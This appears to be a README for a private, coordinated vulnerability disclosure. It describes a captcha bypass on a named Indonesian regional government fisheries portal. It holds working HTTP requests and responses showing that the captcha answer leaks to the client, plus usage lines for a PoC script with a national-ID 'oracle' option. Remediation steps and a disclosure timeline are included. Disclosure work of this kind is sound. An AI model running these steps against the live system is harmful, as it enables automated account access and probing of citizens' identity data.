# SIMPADAN TANGKAP — Captcha Bypass (Broken Anti-Automation) PoC

> **STATUS: PRIVATE / COORDINATED DISCLOSURE.**
> Do **not** make this repository public until the vendor confirms remediation.
> Do not attach `flows*.txt` / `flows*.mitm` / `recon/` — they contain live
> session cookies, CSRF tokens, and personal data.

## Summary

`captcha.php?action=generate` returns the **answer** to the challenge to the
client. For `count_items`, the JSON response contains `target` and `grid`, so
the number of `target` occurrences can be counted automatically. The captcha
that protects login (`login.php`) and registration (`submit_inbox`) can
therefore be solved programmatically, and a valid session/CSRF token is issued
immediately after.

## Affected asset

| Field | Value |
|---|---|
| System | SIMPADAN TANGKAP — Dinas Peternakan dan Perikanan Kabupaten Situbondo |
| Host | `perikanantangkap.situbondokab.go.id` |
| Path | `/simpadan/captcha.php` |
| Class | Broken Access Control / Insufficient Anti-Automation (Captcha Bypass) |
| Severity | Medium |
| Status | Reported (validated) |

## Root cause

The challenge and its solution are generated server-side but the solution
(`target`, `grid`) is sent to the client. Verification is expected to require
the human-computed value, but since the value is derivable from the response,
no human interaction is needed. No meaningful rate limiting was observed.

## Proof (single-shot, validated)

```http
GET /simpadan/captcha.php?action=generate&type=count_items HTTP/2
```
```json
{
  "grid": ["🐡","🍎","🍿","🐶","🐡","🐡","🍇","🐡","🍓","🐹","🐡","🔆","🔆","💫","🍕","🐡"],
  "target": "🐡",
  "type": "count_items",
  "prompt": "Ada berapa 🐡 di grid?",
  "success": true,
  "expires_in": 180
}
```
Solution computed locally: `🐡` occurs **6** times.

```http
POST /simpadan/captcha.php?action=verify HTTP/2
Content-Type: application/json

{"count": 6, "csrf_token": "<csrf>", "website": "", "email_alt": ""}
```
```json
{"success": true, "message": "Verifikasi berhasil"}
```

The server then marks the session verified and issues `SIMPADAN_SESSID`.

## Usage

```bash
# captcha bypass only (no personal data touched)
python captcha_bypass_poc.py --skip-nik

# captcha bypass + a single oracle confirmation with your own test NIK
python captcha_bypass_poc.py --nik <TEST_NIK>
```

Options: `--base <url>`, `--delay <seconds>` (default 3).

The script is intentionally bounded: 5 requests, no loops, no wordlists.

## Scope & ethics

- Authorized VDP testing only.
- Single-shot proof; this is **not** an enumeration tool. Do not adapt it into
  a scanner or point it at NIK ranges.
- No personal data was exfiltrated during validation.
- Never commit capture files or cookies.

## Files

| File | Purpose |
|---|---|
| `captcha_bypass_poc.py` | Single-shot, throttled PoC |
| `laporan-captcha-bypass.md` | Full vulnerability report (Indonesian) |
| `SS_PoC-Captcha.png` | Terminal screenshot of the validated run |

> The screenshot shows the run's `SIMPADAN_SESSID` cookie and CSRF token. Both
> are session-scoped (cookie `Max-Age=7200`) and long expired, but redact them
> if this repository is ever made public.

## Remediation

1. Do not return the solution (`target`/`grid`) for challenges that require it;
   keep challenge state and the expected answer server-side (session).
2. Make challenges single-use and auto-expiring (store a nonce in the session).
3. Add rate limiting / backoff per IP and session on `captcha.php`,
   `login.php`, and `api.php?action=submit_inbox`.
4. Replace the homemade captcha with a bot-management solution
   (e.g. Cloudflare Turnstile).
5. Audit all endpoints protected only by the captcha.

## Disclosure timeline

| Date | Event |
|---|---|
| 2026-10-05 | Vulnerability discovered and validated |
| 2026-10-__ | Reported to the program |
| — | Public disclosure only after vendor confirmation |
